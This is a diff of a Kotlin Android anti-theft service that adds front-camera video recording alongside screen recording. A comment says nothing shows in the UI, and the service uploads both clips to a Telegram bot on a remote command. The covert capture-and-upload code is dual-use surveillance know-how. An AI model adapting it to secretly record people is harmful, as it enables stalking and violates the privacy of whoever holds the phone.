@@ -1,39 +1,61 @@
 package com.guardian.antitheft
 
+import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.hardware.camera2.*
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.MediaRecorder
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.IBinder
 import android.os.Looper
 import android.util.DisplayMetrics
+import android.view.Surface
 import android.view.WindowManager
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
 
 /**
- * Ekranni yozib oladi. Kamera overlay yo'q — faqat sof ekran yozuvi.
- *   sendToTelegram = false → filesDir/recordings/ ga saqlaydi, Telegram'ga ketmaydi
- *   sendToTelegram = true  → saqlaydi + Telegram'ga ham yuboradi (bot buyrug'i)
+ * Ekran va (ixtiyoriy) old kamera yozuvi — paralel, UI'da hech narsa ko'rinmaydi.
+ *
+ * Kamera yozuvi: Camera2 → MediaRecorder.surface → cam_TIMESTAMP.mp4
+ * Ekran yozuvi : MediaProjection → VirtualDisplay → screen_TIMESTAMP.mp4
+ *
+ * EXTRA_WITH_CAMERA = true bo'lsa ikkala fayl ham yoziladi.
+ * EXTRA_SEND_TELEGRAM = true bo'lsa ikkala fayl ham Telegram'ga yuboriladi.
+ * Aks holda: ilovaning filesDir/recordings/ papkasida saqlanadi.
  */
 class ScreenRecordService : Service() {
 
+    // ── Ekran ────────────────────────────────────────────────────────
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
-    private var mediaRecorder: MediaRecorder? = null
-    private var outputFile: File? = null
+    private var screenRecorder: MediaRecorder? = null
+    private var screenFile: File? = null
+
+    // ── Kamera ───────────────────────────────────────────────────────
+    private var cameraDevice: CameraDevice? = null
+    private var cameraSession: CameraCaptureSession? = null
+    private var cameraRecorder: MediaRecorder? = null
+    private var cameraFile: File? = null
+    private var cameraSurface: Surface? = null
+    private val cameraThread = HandlerThread("CamRec").also { it.start() }
+    private val cameraHandler = Handler(cameraThread.looper)
+
+    // ── Umumiy ───────────────────────────────────────────────────────
     private val stopHandler = Handler(Looper.getMainLooper())
     private var recordDurationMs = DEFAULT_DURATION_S * 1000L
-    private var sendToTelegram = false
+    private var sendToTelegram   = false
+    private var withCamera       = false
 
     companion object {
         const val ACTION_START        = "action_start"
@@ -42,6 +64,7 @@ class ScreenRecordService : Service() {
         const val EXTRA_DATA          = "extra_data"
         const val EXTRA_DURATION_SEC  = "duration_sec"
         const val EXTRA_SEND_TELEGRAM = "send_telegram"
+        const val EXTRA_WITH_CAMERA   = "with_camera"
 
         private const val CHANNEL_ID         = "antitheft_screenrec_channel"
         private const val NOTIF_ID           = 46
@@ -64,8 +87,9 @@ class ScreenRecordService : Service() {
                 val code = intent.getIntExtra(EXTRA_CODE, 0)
                 @Suppress("DEPRECATION")
                 val data = intent.getParcelableExtra<Intent>(EXTRA_DATA)
-                sendToTelegram    = intent.getBooleanExtra(EXTRA_SEND_TELEGRAM, false)
-                recordDurationMs  = intent.getIntExtra(EXTRA_DURATION_SEC, DEFAULT_DURATION_S)
+                sendToTelegram   = intent.getBooleanExtra(EXTRA_SEND_TELEGRAM, false)
+                withCamera       = intent.getBooleanExtra(EXTRA_WITH_CAMERA, false)
+                recordDurationMs = intent.getIntExtra(EXTRA_DURATION_SEC, DEFAULT_DURATION_S)
                     .coerceIn(5, MAX_DURATION_S) * 1000L
                 if (data == null) { stopSelf(); return START_NOT_STICKY }
                 startCapture(code, data)
@@ -80,105 +104,178 @@ class ScreenRecordService : Service() {
         isRunning = false
         stopHandler.removeCallbacksAndMessages(null)
         releaseAll()
+        cameraThread.quitSafely()
     }
 
-    // ── Yozuv ────────────────────────────────────────────────────────
+    // ── Yozuvni boshlash ─────────────────────────────────────────────
 
     private fun startCapture(resultCode: Int, data: Intent) {
         val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        val projection = try { mpm.getMediaProjection(resultCode, data) } catch (e: Exception) { null }
-        if (projection == null) { stopSelf(); return }
-        mediaProjection = projection
+        val proj = try { mpm.getMediaProjection(resultCode, data) } catch (e: Exception) { null }
+        if (proj == null) { stopSelf(); return }
+        mediaProjection = proj
 
         val metrics = DisplayMetrics()
         @Suppress("DEPRECATION")
         (getSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(metrics)
-        val width   = ((metrics.widthPixels  * SCALE).toInt()).let { it - it % 2 }.coerceAtLeast(2)
-        val height  = ((metrics.heightPixels * SCALE).toInt()).let { it - it % 2 }.coerceAtLeast(2)
+        val w = ((metrics.widthPixels  * SCALE).toInt()).let { it - it % 2 }.coerceAtLeast(2)
+        val h = ((metrics.heightPixels * SCALE).toInt()).let { it - it % 2 }.coerceAtLeast(2)
 
         val dir = File(filesDir, "recordings").also { it.mkdirs() }
         val ts  = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
-        outputFile = File(dir, "screen_$ts.mp4")
+        screenFile = File(dir, "screen_$ts.mp4")
+        if (withCamera) cameraFile = File(dir, "cam_$ts.mp4")
 
+        // Ekran MediaRecorder
         try {
-            mediaRecorder = MediaRecorder().apply {
+            screenRecorder = MediaRecorder().apply {
                 setVideoSource(MediaRecorder.VideoSource.SURFACE)
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setVideoEncoder(MediaRecorder.VideoEncoder.H264)
-                setVideoSize(width, height)
+                setVideoSize(w, h)
                 setVideoFrameRate(15)
                 setVideoEncodingBitRate(2_000_000)
-                setOutputFile(outputFile!!.absolutePath)
+                setOutputFile(screenFile!!.absolutePath)
                 prepare()
             }
         } catch (e: Exception) { e.printStackTrace(); stopSelf(); return }
 
+        // VirtualDisplay
         try {
-            virtualDisplay = mediaProjection!!.createVirtualDisplay(
-                "AntiTheftSR", width, height, metrics.densityDpi,
+            virtualDisplay = proj.createVirtualDisplay(
+                "AntiTheftSR", w, h, metrics.densityDpi,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                mediaRecorder!!.surface, null, null
+                screenRecorder!!.surface, null, null
             )
-            mediaRecorder!!.start()
+            screenRecorder!!.start()
             isRunning = true
         } catch (e: Exception) { e.printStackTrace(); releaseAll(); stopSelf(); return }
 
+        // Kamera — parallel, ekranda hech narsa ko'rinmaydi
+        if (withCamera) startCameraRecording()
+
         stopHandler.postDelayed({ finishRecording() }, recordDurationMs)
     }
+
+    @SuppressLint("MissingPermission")
+    private fun startCameraRecording() {
+        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        val frontId = cm.cameraIdList.firstOrNull { id ->
+            cm.getCameraCharacteristics(id)
+                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
+        } ?: return
+
+        val orientation = cm.getCameraCharacteristics(frontId)
+            .get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 270
+
+        try {
+            cameraRecorder = MediaRecorder().apply {
+                setVideoSource(MediaRecorder.VideoSource.SURFACE)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+                setVideoSize(480, 640)
+                setVideoFrameRate(30)
+                setVideoEncodingBitRate(1_500_000)
+                setOrientationHint(orientation)
+                setOutputFile(cameraFile!!.absolutePath)
+                prepare()
+            }
+        } catch (e: Exception) { e.printStackTrace(); return }
+
+        cameraSurface = cameraRecorder!!.surface
+
+        try {
+            cm.openCamera(frontId, object : CameraDevice.StateCallback() {
+                override fun onOpened(cam: CameraDevice) {
+                    cameraDevice = cam
+                    val surface = cameraSurface ?: return
+                    try {
+                        cam.createCaptureSession(listOf(surface),
+                            object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(s: CameraCaptureSession) {
+                                    cameraSession = s
+                                    try {
+                                        val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
+                                            .apply {
+                                                addTarget(surface)
+                                                set(CaptureRequest.CONTROL_AE_MODE,
+                                                    CaptureRequest.CONTROL_AE_MODE_ON)
+                                            }.build()
+                                        s.setRepeatingRequest(req, null, cameraHandler)
+                                        cameraRecorder?.start()
+                                    } catch (e: Exception) { e.printStackTrace() }
+                                }
+                                override fun onConfigureFailed(s: CameraCaptureSession) {}
+                            }, cameraHandler)
+                    } catch (e: Exception) { e.printStackTrace() }
+                }
+                override fun onDisconnected(cam: CameraDevice) { cam.close() }
+                override fun onError(cam: CameraDevice, error: Int) { cam.close() }
+            }, cameraHandler)
+        } catch (e: Exception) { e.printStackTrace() }
+    }
+
+    // ── Yakunlash ────────────────────────────────────────────────────
 
     private fun finishRecording() {
         if (!isRunning) { stopSelf(); return }
         isRunning = false
         stopHandler.removeCallbacksAndMessages(null)
 
-        try { mediaRecorder?.stop()    } catch (e: Exception) { }
-        try { mediaRecorder?.release() } catch (e: Exception) { }
-        mediaRecorder = null
-        try { virtualDisplay?.release() } catch (e: Exception) { }
+        // Kamera oldin to'xtatiladi
+        try { cameraSession?.stopRepeating() } catch (e: Exception) { }
+        try { cameraSession?.close()         } catch (e: Exception) { }
+        cameraSession = null
+        try { cameraDevice?.close()          } catch (e: Exception) { }
+        cameraDevice = null
+        try { cameraRecorder?.stop()         } catch (e: Exception) { }
+        try { cameraRecorder?.release()      } catch (e: Exception) { }
+        cameraRecorder = null
+        cameraSurface?.release(); cameraSurface = null
+
+        // Keyin ekran
+        try { screenRecorder?.stop()         } catch (e: Exception) { }
+        try { screenRecorder?.release()      } catch (e: Exception) { }
+        screenRecorder = null
+        try { virtualDisplay?.release()      } catch (e: Exception) { }
         virtualDisplay = null
-        try { mediaProjection?.stop()   } catch (e: Exception) { }
+        try { mediaProjection?.stop()        } catch (e: Exception) { }
         mediaProjection = null
 
-        val file  = outputFile
-        val prefs = SecurePrefs.get(this)
+        val sFile = screenFile
+        val cFile = cameraFile
+        val prefs  = SecurePrefs.get(this)
         val token  = prefs.getString("bot_token", "").orEmpty()
         val chatId = prefs.getString("chat_id",   "").orEmpty()
         val durSec = recordDurationMs / 1000
 
         Thread {
-            when {
-                file == null || !file.exists() -> {
-                    if (sendToTelegram && token.isNotEmpty() && chatId.isNotEmpty())
-                        TelegramSender.sendMessage(token, chatId, "⚠️ Ekran yozuvi fayli topilmadi.")
+            if (sendToTelegram && token.isNotEmpty() && chatId.isNotEmpty()) {
+                if (sFile != null && sFile.exists() && sFile.length() > 0) {
+                    val sz = "%.1f MB".format(sFile.length() / 1024.0 / 1024.0)
+                    TelegramSender.sendVideo(token, chatId, sFile.readBytes(),
+                        "🖥️ Ekran ($durSec s, $sz)")
                 }
-                file.length() == 0L -> {
-                    if (sendToTelegram && token.isNotEmpty() && chatId.isNotEmpty())
-                        TelegramSender.sendMessage(token, chatId, "⚠️ Ekran yozuvi bo'sh chiqdi.")
-                    file.delete()
+                if (cFile != null && cFile.exists() && cFile.length() > 0) {
+                    val sz = "%.1f MB".format(cFile.length() / 1024.0 / 1024.0)
+                    TelegramSender.sendVideo(token, chatId, cFile.readBytes(),
+                        "📷 Kamera ($durSec s, $sz)")
                 }
-                sendToTelegram -> {
-                    if (token.isEmpty() || chatId.isEmpty()) { stopSelf(); return@Thread }
-                    val sizeMb = "%.2f".format(file.length() / 1024.0 / 1024.0)
-                    val ok = TelegramSender.sendVideo(token, chatId, file.readBytes(),
-                        "🖥️ Ekran yozuvi ($durSec s, $sizeMb MB)")
-                    if (!ok) TelegramSender.sendMessage(token, chatId,
-                        "⚠️ Ekran yozuvi ($sizeMb MB) yuborilmadi — fayl ilovada saqlanib qoldi.")
-                }
-                // sendToTelegram=false: ilovada saqlanib qoladi
             }
             stopSelf()
         }.start()
     }
 
     private fun releaseAll() {
-        try { mediaRecorder?.stop()    } catch (e: Exception) { }
-        try { mediaRecorder?.release() } catch (e: Exception) { }
-        mediaRecorder = null
-        try { virtualDisplay?.release() } catch (e: Exception) { }
-        virtualDisplay = null
-        try { mediaProjection?.stop()   } catch (e: Exception) { }
-        mediaProjection = null
-        outputFile?.let { if (it.exists() && it.length() == 0L) it.delete() }
+        try { cameraSession?.close()    } catch (e: Exception) { }; cameraSession = null
+        try { cameraDevice?.close()     } catch (e: Exception) { }; cameraDevice = null
+        try { cameraRecorder?.stop()    } catch (e: Exception) { }
+        try { cameraRecorder?.release() } catch (e: Exception) { }; cameraRecorder = null
+        cameraSurface?.release(); cameraSurface = null
+        try { screenRecorder?.stop()    } catch (e: Exception) { }
+        try { screenRecorder?.release() } catch (e: Exception) { }; screenRecorder = null
+        try { virtualDisplay?.release() } catch (e: Exception) { }; virtualDisplay = null
+        try { mediaProjection?.stop()   } catch (e: Exception) { }; mediaProjection = null
     }
 
     private fun createNotificationChannel() {
@@ -189,7 +286,7 @@ class ScreenRecordService : Service() {
     private fun buildNotification(): Notification =
         Notification.Builder(this, CHANNEL_ID)
             .setContentTitle("AntiTheft Guard")
-            .setContentText("Ekran yozilmoqda...")
+            .setContentText(if (withCamera) "Ekran + kamera yozilmoqda..." else "Ekran yozilmoqda...")
             .setSmallIcon(android.R.drawable.ic_dialog_alert)
             .build()
 }
